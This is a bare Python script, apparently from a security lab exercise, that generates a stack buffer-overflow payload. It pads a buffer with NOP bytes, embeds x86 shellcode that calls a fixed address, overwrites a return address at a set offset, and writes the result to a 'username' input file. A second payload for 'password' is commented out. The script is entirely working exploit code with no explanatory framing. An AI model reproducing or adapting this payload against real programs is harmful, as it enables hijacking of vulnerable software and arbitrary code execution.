#!/usr/bin/python3

# hishamcse@4.240.83.108

#!/usr/bin/python3
import sys 
 
shellcode1= ( 
"\x31\xC9\x31\xC0\xB0\x01\xB1\x08\x51\x50\xBB\x15\x63\x55\x56\xFF\xD3"
).encode('latin-1') 

shellcode2= ( 
"\x31\xC9\x31\xC0\xB0\x88\xB1\x04\x51\x50\xBB\x8D\x62\x55\x56\xFF\xD3"
).encode('latin-1') 
 
# Fill the content with NOPs 
content1 = bytearray(0x90 for i in range(504)) 
# Put the shellcode at the end 
start = 504 - len(shellcode1)
content1[start:start+len(shellcode1) ] = shellcode1

# content2 = bytearray(0x90 for i in range(505)) 
# start = 250
# content2[start:start+len(shellcode2) ] = shellcode2
 
# Put the address at offset 989
ret = 0xffffc988 - 550
offset = 16
content1[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
# for i in range(0, 16, 4):
# 	content1[i: i+4] = (ret).to_bytes(4, byteorder="little")

# ret = 0xffffc988 - 500
# offset = 16
# # content2[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
# for i in range(0, 16, 4):
# 	content2[i: i+4] = (ret).to_bytes(4, byteorder="little")  

 
# Write the content to a file 
with open('username', 'wb') as f:
    f.write(content1) 

# Write the content to a file 
# with open('password', 'wb') as f:
#     f.write(content2) 

